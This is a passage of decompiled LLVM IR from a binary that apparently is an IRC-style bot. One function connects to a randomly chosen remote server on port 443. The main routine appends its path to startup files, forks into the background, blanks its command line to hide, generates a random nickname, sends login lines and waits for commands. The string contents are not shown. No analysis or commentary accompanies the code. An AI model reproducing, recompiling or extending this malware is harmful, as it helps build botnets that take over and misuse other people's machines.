  %v3_9e98 = call i32 @strcat(i8* %v2_9e98, i32 %v1_9e70)
  store i32 %v2_9e7c, i32* @global_var_2f538.92, align 4
  ret i32 %v3_9e98

; uselistorder directives
  uselistorder i32 %v1_9e70, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9ebc = load i32, i32* @fp, align 4
  store i32 40644, i32* %stack_var_-4, align 4
  %v2_9ec0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ec0, i32* @fp, align 4
  %v2_9fe4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_9fe8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_a054 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_9ecc

dec_label_pc_9ecc:                                ; preds = %dec_label_pc_9ecc.backedge, %entry
  store i32 -1, i32* @global_var_2f53c.41, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9ee4 = load i32, i32* @global_var_2ac18.125, align 4
  %v2_9ee8 = icmp eq i32 %v2_9ee4, 0
  br i1 %v2_9ee8, label %dec_label_pc_9ef0, label %dec_label_pc_9f24

dec_label_pc_9ef0:                                ; preds = %dec_label_pc_9ecc
  %v0_9ef0 = call i32 @random()
  %v2_9efc = load i32, i32* @global_var_26350.127, align 4
  %v2_9f08 = srem i32 %v0_9ef0, %v2_9efc
  %v4_9f18 = mul i32 %v2_9f08, 4
  %v5_9f18 = add i32 %v4_9f18, ptrtoint ([14 x i8]** @global_var_26354.130 to i32)
  %v6_9f18 = inttoptr i32 %v5_9f18 to i32*
  %v7_9f18 = load i32, i32* %v6_9f18, align 4
  store i32 %v7_9f18, i32* @global_var_2f544.132, align 4
  br label %dec_label_pc_9f24

dec_label_pc_9f24:                                ; preds = %dec_label_pc_9ecc, %dec_label_pc_9ef0
  store i32 0, i32* @global_var_2ac18.125, align 4
  br label %dec_label_pc_9f30

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f30, %dec_label_pc_9f24
  %v0_9f3c = call i32 @socket()
  store i32 %v0_9f3c, i32* @global_var_2f53c.41, align 4
  %v1_9f54 = icmp slt i32 %v0_9f3c, 0
  br i1 %v1_9f54, label %dec_label_pc_9f30, label %dec_label_pc_9f5c

dec_label_pc_9f5c:                                ; preds = %dec_label_pc_9f30
  %v2_9f60 = load i32, i32* @global_var_2f544.132, align 4
  store i32 %v2_9f60, i32* @r0, align 4
  %v1_9f68 = call i32 @inet_addr(i32 %v2_9f60)
  %v2_9f70 = icmp eq i32 %v1_9f68, 0
  br i1 %v2_9f70, label %dec_label_pc_9f94, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f5c
  %v2_9f7c = load i32, i32* @global_var_2f544.132, align 4
  store i32 %v2_9f7c, i32* @r0, align 4
  %v1_9f84 = call i32 @inet_addr(i32 %v2_9f7c)
  %v3_9f8c = icmp eq i32 %v1_9f84, -1
  br i1 %v3_9f8c, label %dec_label_pc_9f94, label %dec_label_pc_a008

dec_label_pc_9f94:                                ; preds = %dec_label_pc_9f78, %dec_label_pc_9f5c
  %v2_9f98 = load i32, i32* @global_var_2f544.132, align 4
  %v1_9fa0 = call i32 @__GI_gethostbyname(i32 %v2_9f98)
  %v2_9fb0 = icmp eq i32 %v1_9fa0, 0
  br i1 %v2_9fb0, label %dec_label_pc_9fb8, label %dec_label_pc_9fd8

dec_label_pc_9fb8:                                ; preds = %dec_label_pc_9f94
  store i32 0, i32* @global_var_2f544.132, align 4
  %v2_9fc8 = load i32, i32* @global_var_2f53c.41, align 4
  store i32 %v2_9fc8, i32* @r0, align 4
  %v0_9fd0 = call i32 @close()
  br label %dec_label_pc_9ecc.backedge

dec_label_pc_9ecc.backedge:                       ; preds = %dec_label_pc_9fb8, %dec_label_pc_a188
  br label %dec_label_pc_9ecc

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9f94
  %v1_9fdc = add i32 %v1_9fa0, 16
  %v2_9fdc = inttoptr i32 %v1_9fdc to i32*
  %v3_9fdc = load i32, i32* %v2_9fdc, align 4
  %v1_9fe0 = inttoptr i32 %v3_9fdc to i32*
  %v2_9fe0 = load i32, i32* %v1_9fe0, align 4
  %v1_9ff0 = add i32 %v1_9fa0, 12
  %v2_9ff0 = inttoptr i32 %v1_9ff0 to i32*
  %v3_9ff0 = load i32, i32* %v2_9ff0, align 4
  store i32 %v3_9ff0, i32* @r2, align 4
  %v3_a000 = call i32 @bcopy(i32 %v2_9fe0, i32 %v2_9fe8, i32 %v3_9ff0)
  br label %dec_label_pc_a020

dec_label_pc_a008:                                ; preds = %dec_label_pc_9f78
  %v2_a00c = load i32, i32* @global_var_2f544.132, align 4
  store i32 %v2_a00c, i32* @r0, align 4
  %v1_a014 = call i32 @inet_addr(i32 %v2_a00c)
  store i32 %v1_a014, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9fd8, %dec_label_pc_a008
  store i32 2, i32* %stack_var_-44, align 4
  %v1_a038 = call i32 @htons(i32 443)
  %v2_a050 = load i32, i32* @global_var_2f53c.41, align 4
  store i32 %v2_a050, i32* @r0, align 4
  %v3_a064 = call i32 @ioctl(i32 %v2_a050, i32 21537, i32 %v2_a054)
  %v2_a06c = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_a168

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a168
  %v0_a07c = call i32 @__errno_location()
  %v2_a088 = inttoptr i32 %v0_a07c to i32*
  store i32 0, i32* %v2_a088, align 4
  %v2_a090 = load i32, i32* @global_var_2f53c.41, align 4
  store i32 %v2_a090, i32* @r0, align 4
  store i32 %v2_9fe4, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_a0a4 = call i32 @connect()
  %v2_a0ac = icmp eq i32 %v0_a0a4, 0
  br i1 %v2_a0ac, label %dec_label_pc_a0c8, label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_a07c
  %v0_a0b4 = call i32 @__errno_location()
  %v1_a0bc = inttoptr i32 %v0_a0b4 to i32*
  %v2_a0bc = load i32, i32* %v1_a0bc, align 4
  %v7_a0c0 = icmp eq i32 %v2_a0bc, 106
  br i1 %v7_a0c0, label %dec_label_pc_a0c8, label %dec_label_pc_a138

dec_label_pc_a0c8:                                ; preds = %dec_label_pc_a0b4, %dec_label_pc_a07c
  %v2_a0cc = load i32, i32* @global_var_2f53c.41, align 4
  %v6_a0e8 = call i32 @__GI_setsockopt(i32 %v2_a0cc, i32 1, i32 13, i32* null, i32 0)
  %v2_a0f0 = load i32, i32* @global_var_2f53c.41, align 4
  %v6_a10c = call i32 @__GI_setsockopt(i32 %v2_a0f0, i32 1, i32 2, i32* null, i32 0)
  %v2_a114 = load i32, i32* @global_var_2f53c.41, align 4
  %v6_a130 = call i32 @__GI_setsockopt(i32 %v2_a114, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_9ebc, i32* @fp, align 4
  ret i32 %v6_a130

dec_label_pc_a138:                                ; preds = %dec_label_pc_a0b4
  %v0_a138 = call i32 @__errno_location()
  %v1_a140 = inttoptr i32 %v0_a138 to i32*
  %v2_a140 = load i32, i32* %v1_a140, align 4
  %v7_a144 = icmp eq i32 %v2_a140, 115
  br i1 %v7_a144, label %dec_label_pc_a160, label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %dec_label_pc_a138
  %v0_a14c = call i32 @__errno_location()
  %v1_a154 = inttoptr i32 %v0_a14c to i32*
  %v2_a154 = load i32, i32* %v1_a154, align 4
  %v7_a158 = icmp eq i32 %v2_a154, 114
  br i1 %v7_a158, label %dec_label_pc_a160, label %dec_label_pc_a188

dec_label_pc_a160:                                ; preds = %dec_label_pc_a14c, %dec_label_pc_a138
  %v1_a164 = call i32 @sleep(i32 1)
  br label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a160
  %v2_a16c = call i32 @__GI_time(i32* null)
  %v2_a17c = sub i32 %v2_a16c, %v2_a06c
  %tmp = icmp ult i32 %v2_a17c, 10
  br i1 %tmp, label %dec_label_pc_a07c, label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a14c, %dec_label_pc_a168
  store i32 0, i32* @global_var_2f544.132, align 4
  %v2_a198 = load i32, i32* @global_var_2f53c.41, align 4
  store i32 %v2_a198, i32* @r0, align 4
  %v0_a1a0 = call i32 @close()
  br label %dec_label_pc_9ecc.backedge

; uselistorder directives
  uselistorder i32 %v3_9ff0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_a188, { 1, 0 }
  uselistorder label %dec_label_pc_a168, { 1, 0 }
  uselistorder label %dec_label_pc_a020, { 1, 0 }
  uselistorder label %dec_label_pc_9ecc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9f24, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2704 = alloca i32, align 4
  %stack_var_-6800 = alloca i32, align 4
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-390 = alloca i32, align 4
  %stack_var_-1680 = alloca i32, align 4
  %stack_var_-656 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_a1c8 = load i32, i32* @r4, align 4
  store i32 %v3_a1c8, i32* %stack_var_-20, align 4
  store i32 41424, i32* %stack_var_-4, align 4
  %v16_a1c8 = ptrtoint i32* %stack_var_-20 to i32
  %v2_a1cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a1cc, i32* @fp, align 4
  %v3_a1e4 = add i32 %v16_a1c8, -6784
  %v4_a1e4 = inttoptr i32 %v3_a1e4 to i32*
  store i32 %argc, i32* %v4_a1e4, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_1c640.134 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c410.56 to i32), i32* @r1, align 4
  %v3_a208 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1c640.134 to i32), i32 ptrtoint (i32* @global_var_1c410.56 to i32))
  %v2_a218 = icmp eq i32 %v3_a208, 0
  br i1 %v2_a218, label %dec_label_pc_a220, label %dec_label_pc_a23c

dec_label_pc_a220:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1c654.137 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c410.56 to i32), i32* @r1, align 4
  %v3_a230 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1c654.137 to i32), i32 ptrtoint (i32* @global_var_1c410.56 to i32))
  br label %dec_label_pc_a23c

dec_label_pc_a23c:                                ; preds = %entry, %dec_label_pc_a220
  %stack_var_-72.0 = phi i32 [ %v3_a230, %dec_label_pc_a220 ], [ %v3_a208, %entry ]
  %stack_var_-76.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c654.137, i32 0, i32 0), %dec_label_pc_a220 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1c640.134, i32 0, i32 0), %entry ]
  %v2_a240 = icmp eq i32 %stack_var_-72.0, 0
  br i1 %v2_a240, label %dec_label_pc_a3d0, label %dec_label_pc_a248

dec_label_pc_a248:                                ; preds = %dec_label_pc_a23c
  %v1_a258 = bitcast i8** %argv to i32*
  %v2_a258 = load i32, i32* %v1_a258, align 4
  %v1_a25c = inttoptr i32 %v2_a258 to i8*
  %v3_a260 = call i32 @strlen(i8* %v1_a25c)
  %v2_a274 = ptrtoint i32* %stack_var_-340 to i32
  %v2_a280 = call i32 @getcwd(i32 %v2_a274, i32 256)
  store i32 ptrtoint (i32* @global_var_1c664.139 to i32), i32* @r1, align 4
  %v2_a290 = bitcast i32* %stack_var_-340 to i8*
  %v3_a290 = call i32 @__GI_strcoll(i8* %v2_a290, i32 ptrtoint (i32* @global_var_1c664.139 to i32))
  %v2_a298 = icmp eq i32 %v3_a290, 0
  br i1 %v2_a298, label %dec_label_pc_a3c8, label %dec_label_pc_a2b0

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a2b0
  %v1_a2a8 = add i32 %stack_var_-60.0, -1
  br label %dec_label_pc_a2b0

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a248, %dec_label_pc_a2a4
  %stack_var_-60.0 = phi i32 [ %v1_a2a8, %dec_label_pc_a2a4 ], [ %v3_a260, %dec_label_pc_a248 ]
  %v2_a2c0 = load i32, i32* %v1_a258, align 4
  %v2_a2c8 = add i32 %v2_a2c0, %stack_var_-60.0
  %v1_a2cc = inttoptr i32 %v2_a2c8 to i8*
  %v2_a2cc = load i8, i8* %v1_a2cc, align 1
  %v7_a2d0 = icmp eq i8 %v2_a2cc, 47
  br i1 %v7_a2d0, label %dec_label_pc_a2d8, label %dec_label_pc_a2a4

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a2b0
  %v2_a2f4 = ptrtoint i32* %stack_var_-656 to i32
  store i32 %v2_a2f4, i32* @r0, align 4
  %v4_a308 = call i32 @sprintf(i32 %v2_a2f4, i32 ptrtoint ([8 x i8]* @global_var_1c668.141 to i32), i32 %v2_a274)
  %v1_a35c = inttoptr i32 %stack_var_-72.0 to i8*
  %v2_a314 = ptrtoint i32* %stack_var_-1680 to i32
  %v2_a33c = bitcast i32* %stack_var_-1680 to i8*
  br label %dec_label_pc_a358.outer

dec_label_pc_a310:                                ; preds = %dec_label_pc_a358
  %v3_a324 = call i32 @fgets(i32 %v2_a314, i32 1024, i32 %stack_var_-72.0)
  %v3_a33c = call i32 @__GI_strcasecmp(i8* %v2_a33c, i32 %v2_a2f4)
  %v2_a344 = icmp eq i32 %v3_a33c, 0
  br i1 %v2_a344, label %dec_label_pc_a34c, label %dec_label_pc_a358

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a310
  %v1_a350 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_a358.outer

dec_label_pc_a358.outer:                          ; preds = %dec_label_pc_a34c, %dec_label_pc_a2d8
  %stack_var_-56.0.ph = phi i32 [ %v1_a350, %dec_label_pc_a34c ], [ 0, %dec_label_pc_a2d8 ]
  br label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a358.outer, %dec_label_pc_a310
  %v2_a35c = call i32 @feof(i8* %v1_a35c)
  %v2_a364 = icmp eq i32 %v2_a35c, 0
  br i1 %v2_a364, label %dec_label_pc_a310, label %dec_label_pc_a36c

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a358
  %v2_a370 = icmp eq i32 %stack_var_-56.0.ph, 0
  %v2_a37c = call i32 @__GI_fclose(i8* %v1_a35c)
  br i1 %v2_a370, label %dec_label_pc_a378, label %dec_label_pc_a3d0

dec_label_pc_a378:                                ; preds = %dec_label_pc_a36c
  %v4_a380 = ptrtoint i8* %stack_var_-76.0 to i32
  store i32 %v4_a380, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c670.143 to i32), i32* @r1, align 4
  %v3_a388 = call i32 @__GI_fopen(i32 %v4_a380, i32 ptrtoint (i32* @global_var_1c670.143 to i32))
  %v2_a398 = icmp eq i32 %v3_a388, 0
  br i1 %v2_a398, label %dec_label_pc_a3d0, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a378
  %v2_a3ac = call i32 @__GI_fputs(i32 %v2_a2f4, i32 %v3_a388)
  %v1_a3b4 = inttoptr i32 %v3_a388 to i8*
  %v2_a3b4 = call i32 @__GI_fclose(i8* %v1_a3b4)
  br label %dec_label_pc_a3d0

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a248
  %v1_a3cc = inttoptr i32 %stack_var_-72.0 to i8*
  %v2_a3cc = call i32 @__GI_fclose(i8* %v1_a3cc)
  br label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a36c, %dec_label_pc_a378, %dec_label_pc_a23c, %dec_label_pc_a3a0, %dec_label_pc_a3c8
  %v0_a3d0 = call i32 @fork()
  %v2_a3d8 = icmp eq i32 %v0_a3d0, 0
  br i1 %v2_a3d8, label %dec_label_pc_a3e8, label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a3d0
  %v1_a3e4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3d0, %dec_label_pc_a3e0
  %v1_a3f8 = bitcast i8** %argv to i32*
  %v2_a3f8 = load i32, i32* %v1_a3f8, align 4
  store i32 %v2_a3f8, i32* @r4, align 4
  %v2_a40c = load i32, i32* %v1_a3f8, align 4
  %v1_a410 = inttoptr i32 %v2_a40c to i8*
  %v3_a414 = call i32 @strlen(i8* %v1_a410)
  %v0_a41c = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1c674.145 to i32), i32* @r1, align 4
  %v4_a428 = call i32 @strncpy(i32 %v0_a41c, i32 ptrtoint ([6 x i8]* @global_var_1c674.145 to i32), i32 %v3_a414)
  br label %dec_label_pc_a4ac

dec_label_pc_a438:                                ; preds = %dec_label_pc_a4ac
  %v3_a43c = mul i32 %storemerge13, 4
  %v2_a454 = add i32 %v3_a43c, %tmp
  %v1_a458 = inttoptr i32 %v2_a454 to i32*
  %v2_a458 = load i32, i32* %v1_a458, align 4
  store i32 %v2_a458, i32* @r4, align 4
  %v2_a47c = load i32, i32* %v1_a458, align 4
  %v1_a480 = inttoptr i32 %v2_a47c to i8*
  %v3_a484 = call i32 @strlen(i8* %v1_a480)
  %v0_a48c = load i32, i32* @r4, align 4
  store i32 %v0_a48c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v3_a484, i32* @r2, align 4
  %v0_a49c = call i32 @__GI_memset()
  %v1_a4a4 = add i32 %storemerge13, 1
  br label %dec_label_pc_a4ac

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a438
  %storemerge13 = phi i32 [ 1, %dec_label_pc_a3e8 ], [ %v1_a4a4, %dec_label_pc_a438 ]
  %v4_a4bc = load i32, i32* %v4_a1e4, align 4
  %v5_a4c4 = icmp slt i32 %storemerge13, %v4_a4bc
  br i1 %v5_a4c4, label %dec_label_pc_a438, label %dec_label_pc_a4c8

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a4ac
  %v2_a4cc = call i32 @__GI_time(i32* null)
  store i32 %v2_a4cc, i32* @r4, align 4
  %v0_a4d4 = call i32 @__libc_getpid()
  %v0_a4dc = load i32, i32* @r4, align 4
  %v2_a4dc = xor i32 %v0_a4dc, %v0_a4d4
  store i32 %v2_a4dc, i32* @r4, align 4
  %v0_a4e0 = call i32 @getppid()
  %v0_a4e8 = load i32, i32* @r4, align 4
  %v2_a4e8 = add i32 %v0_a4e8, %v0_a4e0
  %v1_a4f0 = call i32 @srand(i32 %v2_a4e8)
  %v1_a4fc = call i32 @makestring(i32 %v1_a4f0)
  %v2_a50c = ptrtoint i32* %stack_var_-390 to i32
  %v3_a518 = call i32 @strcpy(i32 %v2_a50c, i8* bitcast (i32* @global_var_1c61c.122 to i8*))
  store i32 %v1_a4fc, i32* @r1, align 4
  %v2_a52c = bitcast i32* %stack_var_-390 to i8*
  %v3_a52c = call i32 @strcat(i8* %v2_a52c, i32 %v1_a4fc)
  store i32 %v2_a50c, i32* @global_var_2f538.92, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c67c.150 to i32), i32* @global_var_2f530.58, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1c680.154 to i32), i32* @global_var_2f540.152, align 4
  store i32 ptrtoint (i32* @global_var_1c68c.157 to i32), i32* @global_var_2f550.62, align 4
  store i32 ptrtoint (i32* @global_var_1c61c.122 to i32), i32* @global_var_2f54c.102, align 4
  store i32 ptrtoint (i32* @global_var_1c61c.122 to i32), i32* @global_var_2f534.160, align 4
  store i32 0, i32* @global_var_2f544.132, align 4
  %v2_a5ec = ptrtoint i32* %stack_var_-656 to i32
  %v2_a6ac = ptrtoint i32* %stack_var_-400 to i32
  %v2_a8cc = ptrtoint i32* %stack_var_-6800 to i32
  %v2_a908 = add i32 %v16_a1c8, -6780
  %v2_a9c4 = ptrtoint i32* %stack_var_-2704 to i32
  %v2_aa78 = ptrtoint i32* %stack_var_-1680 to i32
  %v3_ab50 = bitcast i32* %stack_var_-1680 to i8*
  br label %dec_label_pc_a58c

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a8bc, %dec_label_pc_a628, %dec_label_pc_ab40, %dec_label_pc_a4c8
  %v0_a58c = call i32 @con()
  %v2_a594 = load i32, i32* @global_var_2f53c.41, align 4
  %v2_a59c = load i32, i32* @global_var_2f534.160, align 4
  %v4_a5ac = call i32 @Send(i32 %v2_a594, i32 ptrtoint ([9 x i8]* @global_var_1c690.164 to i32), i32 %v2_a59c)
  %v2_a5b4 = load i32, i32* @global_var_2f53c.41, align 4
  %v2_a5bc = load i32, i32* @global_var_2f538.92, align 4
  store i32 %v2_a5bc, i32* @ip, align 4
  %v2_a5c4 = load i32, i32* @global_var_2f530.58, align 4
  store i32 %v2_a5c4, i32* @lr, align 4
  %v4_a5e4 = call i32 @Send(i32 %v2_a5b4, i32 ptrtoint ([41 x i8]* @global_var_1c69c.166 to i32), i32 %v2_a5bc)
  br label %dec_label_pc_a600.lr.ph

dec_label_pc_a600.lr.ph:                          ; preds = %dec_label_pc_a874, %dec_label_pc_a8f8, %dec_label_pc_ab60, %dec_label_pc_ab80, %dec_label_pc_a58c
  br label %dec_label_pc_a600

dec_label_pc_a600:                                ; preds = %dec_label_pc_a600.lr.ph, %dec_label_pc_a600
  %storemerge1428 = phi i32 [ 0, %dec_label_pc_a600.lr.ph ], [ %v1_a614, %dec_label_pc_a600 ]
  %v5_a60c = mul nuw nsw i32 %storemerge1428, 4
  %v6_a60c = add i32 %v5_a60c, %v2_a5ec
  %v7_a60c = inttoptr i32 %v6_a60c to i32*
  store i32 0, i32* %v7_a60c, align 4
  %v1_a614 = add nuw nsw i32 %storemerge1428, 1
  %tmp75 = icmp ult i32 %v1_a614, 32
  br i1 %tmp75, label %dec_label_pc_a600, label %dec_label_pc_a628

dec_label_pc_a628:                                ; preds = %dec_label_pc_a600
  %v2_a62c = load i32, i32* @global_var_2f53c.41, align 4
  %v3_a630 = udiv i32 %v2_a62c, 32
  %v3_a644 = mul nuw nsw i32 %v3_a630, 4
  %v2_a64c = add i32 %v3_a644, %v16_a1c8
  %v2_a650 = add i32 %v2_a64c, -636
  %v1_a654 = inttoptr i32 %v2_a650 to i32*
  %v2_a654 = load i32, i32* %v1_a654, align 4
  %v1_a660 = urem i32 %v2_a62c, 32
  %v6_a668 = shl i32 1, %v1_a660
  %v2_a66c = or i32 %v2_a654, %v6_a668
  store i32 %v2_a66c, i32* %v1_a654, align 4
  store i32 1200, i32* %stack_var_-400, align 4
  %v2_a6a0 = load i32, i32* @global_var_2f53c.41, align 4
  %v1_a6a4 = add i32 %v2_a6a0, 1
  %v5_a6c0 = call i32 @__libc_select(i32 %v1_a6a4, i32 %v2_a5ec, i32 0, i32 0, i32 %v2_a6ac)
  %tmp76 = icmp slt i32 %v5_a6c0, 1
  br i1 %tmp76, label %dec_label_pc_a58c, label %dec_label_pc_a860.preheader

dec_label_pc_a860.preheader:                      ; preds = %dec_label_pc_a628
  %v2_a864106 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_a86c108 = icmp eq i32 %v2_a864106, 0
  br i1 %v3_a86c108, label %dec_label_pc_a874, label %dec_label_pc_a6dc

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a854, %dec_label_pc_a860.preheader
  %storemerge15115 = phi i32 [ %.pre133, %dec_label_pc_a854 ], [ 0, %dec_label_pc_a860.preheader ]
  %v3_a6e0 = mul i32 %storemerge15115, 4
  %v2_a6ec = load i32, i32* @global_var_2f554.52, align 4
  %v2_a6f0 = add i32 %v2_a6ec, %v3_a6e0
  %v1_a6f4 = inttoptr i32 %v2_a6f0 to i32*
  %v2_a6f4 = load i32, i32* %v1_a6f4, align 4
  %v3_a704 = call i32 @waitpid(i32 %v2_a6f4, i32 0, i32 1)
  %tmp77 = icmp slt i32 %v3_a704, 1
  %.pre133 = add i32 %storemerge15115, 1
  br i1 %tmp77, label %dec_label_pc_a854, label %dec_label_pc_a76c.preheader

dec_label_pc_a76c.preheader:                      ; preds = %dec_label_pc_a6dc
  %v2_a77085 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_a77887 = icmp ult i32 %.pre133, %v2_a77085
  %v3_a78488 = mul i32 %.pre133, 4
  %v2_a79089 = load i32, i32* @global_var_2f554.52, align 4
  %v2_a79490 = add i32 %v2_a79089, %v3_a78488
  %v1_a79891 = add i32 %v2_a79490, -4
  br i1 %v3_a77887, label %dec_label_pc_a724, label %dec_label_pc_a780

dec_label_pc_a724:                                ; preds = %dec_label_pc_a76c.preheader, %dec_label_pc_a724
  %v1_a79895 = phi i32 [ %v1_a798, %dec_label_pc_a724 ], [ %v1_a79891, %dec_label_pc_a76c.preheader ]
  %v2_a79494 = phi i32 [ %v2_a794, %dec_label_pc_a724 ], [ %v2_a79490, %dec_label_pc_a76c.preheader ]
  %v1_a71892 = phi i32 [ %v1_a718, %dec_label_pc_a724 ], [ %.pre133, %dec_label_pc_a76c.preheader ]
  %v1_a758 = inttoptr i32 %v2_a79494 to i32*
  %v2_a758 = load i32, i32* %v1_a758, align 4
  %v2_a75c = inttoptr i32 %v1_a79895 to i32*
  store i32 %v2_a758, i32* %v2_a75c, align 4
  %v1_a718 = add i32 %v1_a71892, 1
  %v2_a770 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_a778 = icmp ult i32 %v1_a718, %v2_a770
  %v3_a784 = mul i32 %v1_a718, 4
  %v2_a790 = load i32, i32* @global_var_2f554.52, align 4
  %v2_a794 = add i32 %v2_a790, %v3_a784
  %v1_a798 = add i32 %v2_a794, -4
  br i1 %v3_a778, label %dec_label_pc_a724, label %dec_label_pc_a76c.dec_label_pc_a780_crit_edge

dec_label_pc_a76c.dec_label_pc_a780_crit_edge:    ; preds = %dec_label_pc_a724
  br label %dec_label_pc_a780

dec_label_pc_a780:                                ; preds = %dec_label_pc_a76c.dec_label_pc_a780_crit_edge, %dec_label_pc_a76c.preheader
  %v1_a798.lcssa = phi i32 [ %v1_a798, %dec_label_pc_a76c.dec_label_pc_a780_crit_edge ], [ %v1_a79891, %dec_label_pc_a76c.preheader ]
  %v2_a7a0 = inttoptr i32 %v1_a798.lcssa to i32*
  store i32 0, i32* %v2_a7a0, align 4
  %v2_a7a8 = load i32, i32* @global_var_2ac28.50, align 4
  %v1_a7ac = add i32 %v2_a7a8, -1
  store i32 %v1_a7ac, i32* @global_var_2ac28.50, align 4
  %v3_a7c0 = mul i32 %v1_a7ac, 4
  %v1_a7c4 = add i32 %v3_a7c0, 4
  %v1_a7cc = call i32 @malloc(i32 %v1_a7c4)
  %v2_a82899 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_a830101 = icmp eq i32 %v2_a82899, 0
  br i1 %v3_a830101, label %dec_label_pc_a838, label %dec_label_pc_a7e4

dec_label_pc_a7e4:                                ; preds = %dec_label_pc_a780, %dec_label_pc_a7e4
  %storemerge17102 = phi i32 [ %v1_a81c, %dec_label_pc_a7e4 ], [ 0, %dec_label_pc_a780 ]
  %v3_a7e8 = mul i32 %storemerge17102, 4
  %v2_a7f4 = add i32 %v3_a7e8, %v1_a7cc
  %v2_a808 = load i32, i32* @global_var_2f554.52, align 4
  %v2_a80c = add i32 %v2_a808, %v3_a7e8
  %v1_a810 = inttoptr i32 %v2_a80c to i32*
  %v2_a810 = load i32, i32* %v1_a810, align 4
  %v2_a814 = inttoptr i32 %v2_a7f4 to i32*
  store i32 %v2_a810, i32* %v2_a814, align 4
  %v1_a81c = add i32 %storemerge17102, 1
  %v2_a828 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_a830 = icmp ult i32 %v1_a81c, %v2_a828
  br i1 %v3_a830, label %dec_label_pc_a7e4, label %dec_label_pc_a824.dec_label_pc_a838_crit_edge

dec_label_pc_a824.dec_label_pc_a838_crit_edge:    ; preds = %dec_label_pc_a7e4
  br label %dec_label_pc_a838

dec_label_pc_a838:                                ; preds = %dec_label_pc_a780, %dec_label_pc_a824.dec_label_pc_a838_crit_edge
  %v2_a83c = load i32, i32* @global_var_2f554.52, align 4
  store i32 %v2_a83c, i32* @r0, align 4
  %v0_a844 = call i32 @free()
  store i32 %v1_a7cc, i32* @global_var_2f554.52, align 4
  br label %dec_label_pc_a854

dec_label_pc_a854:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a838
  %v2_a864 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_a86c = icmp ult i32 %.pre133, %v2_a864
  br i1 %v3_a86c, label %dec_label_pc_a6dc, label %dec_label_pc_a874

dec_label_pc_a874:                                ; preds = %dec_label_pc_a854, %dec_label_pc_a860.preheader
  %v2_a878 = load i32, i32* @global_var_2f53c.41, align 4
  %v3_a87c = udiv i32 %v2_a878, 32
  %v3_a888 = mul nuw nsw i32 %v3_a87c, 4
